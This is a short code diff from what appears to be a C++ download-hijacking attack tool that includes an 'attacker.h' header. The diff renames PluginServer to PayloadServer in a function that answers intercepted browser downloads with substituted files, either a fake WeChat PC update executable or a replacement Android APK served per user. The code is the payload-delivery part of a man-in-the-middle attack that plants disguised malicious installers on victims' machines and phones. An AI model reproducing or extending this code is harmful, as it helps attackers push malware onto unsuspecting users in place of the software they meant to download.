@@ -1,5 +1,5 @@
 #include "browserdownload.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../attacker.h"
 #include "../HttpUtils.h"
 #include "../cipher/CryptoUtils.h"
@@ -65,13 +65,13 @@ int BrowserDownload::replyBrowserDownload(char* dstbuf, int len, int dstbuflimit
 	if (gBaiduDownloadFlag == 2)
 	{
 		string filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpExeFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpExeFormat, 1);
 		return 0;
 	}
 	else if (gBaiduDownloadFlag == 1)
 	{
 		string filename = Public::getUserUrl(lphttp->username, ANDROID_REPLACE_FILENAME);
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpApkFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpApkFormat, 1);
 		return 0;
 	}
 
